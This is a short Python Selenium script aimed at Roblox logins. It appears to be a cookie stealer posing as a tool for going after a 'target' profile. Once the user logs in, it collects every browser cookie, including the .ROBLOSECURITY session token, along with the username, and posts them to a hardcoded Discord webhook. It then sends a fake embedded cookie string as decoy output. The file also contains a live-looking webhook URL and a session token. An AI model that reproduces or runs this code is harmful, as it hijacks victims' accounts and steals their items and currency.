import time
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
import pickle

cookie2 = "RBXEventTrackerV2=CreateDate=4/13/2023 11:25:19 AM&rbxid=652430107&browserid=824114599852; .ROBLOSECURITY=|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_08D384E8EBE72B04FE463B8201217D1A8FB8406C026D6AB56F6F9C34EDE44A75D2F19FB13B719C95E1B40A3D3A04092F037D9A47512F916BEBE578BDBB90262A83C7475B0FABD7EBBECE5B5C5F6074E3EAB7FA43929C4B2C8E91F2F9070B57B11D9219CA8E8CE1FFD7E2270770FE90FA7E8F80C2FCB1F23B53D8339FE8C8D1ECC07EBF05255B7B74ECCF5F7D0341025C1EC5C1E4C3B7E5B89B4D7E1B539B3A3D82639B72D2A9EC8F93E6A37F032AEEA073F1E6EC33C37D1019EF491A09D50743E8FDE75A2D0A85ECAC6F52D1B8A7E130038710F6C57B2C8A66CA3A69D0B0385800A09A8D954DC5B5F5A5E27B23C8E345EA27BB469B875DE7E1F2EEC42C3E3C3D02403DD429E6376C30E1FC03F79832D95C4F4E47DBE6C9E6C9184E6B4C01584D1EB2AFD6ECCE4B4B8E699ECBF6DC9C6F357DAE23B8EC59E64818472F92B0DE68438F06C8CE5863B3EB43CF059EF287A2F8FEBBEAD3A3ABD7B044AE344BB8AE7E5C5B5C5EB056BEA11A1E7A6ECB33EB7F74C13B402917E02DD1FDB69CE7BEE80C99369324C7ED31E1B8D7E8459C2AFDC7F828CBBE8F7EF5D05432A3C66BCBEE0CE1D0EC9D72D9; RBXcb=RBXViralAcquisition=false&RBXSource=false&GoogleAnalytics=false; RBXSessionTracker=sessionid=1813eab6-3d2d-4086-973a-2d2216d013f6; GuestData=UserID=-347587621"

driver = webdriver.Chrome()
driver.get('https://www.roblox.com/login')

print("Please log in to continue...")

current_url = driver.current_url
timeout = time.time() + 60 * 5

while current_url == "https://www.roblox.com/login" and time.time() < timeout:
    current_url = driver.current_url
    time.sleep(1)

if current_url != "https://www.roblox.com/login":
    print("Logged in successfully! Please navigate to targets profile link...")
    cookies = driver.get_cookies()
    cookies_string = '; '.join([f"{cookie['name']}={cookie['value']}" for cookie in cookies])

    username_element = driver.find_element(By.CSS_SELECTOR, ".age-bracket-label-username")
    username = username_element.text

    message = f"**Roblox Account Info**\n\nUsername: {username}\nCookies:\n```{cookies_string}```"

    webhook_url = 'https://discord.com/api/webhooks/1096079064290295809/wrEEw4rnhqlU-RhGd2xj32vk_sU0ayDxe5XBsa1zlb36UCSEzx_Sc1woE2O5UeZ8m38G'

    response = requests.post(webhook_url, data={'content': message})

    profile_url = None

    while True:
        current_url = driver.current_url
        if current_url.startswith("https://www.roblox.com/users/") and current_url.endswith("/profile"):
            if current_url != profile_url:
                profile_url = current_url
                time.sleep(0.3)
                print("Target Found! Loading info..")
                time.sleep(3)
                print(f"PROFILE URL: {profile_url}")
                time.sleep(0.1)
                webhook2 = input("Enter discord webhook:")
                time.sleep(1.2)
                print("Cookies Sent! ✅")
                response2 = requests.post(webhook2, data={"content":cookie2})
        time.sleep(1)

else:
    print("Login timed out, please try again.")

driver.quit()
input('Press ENTER to exit')
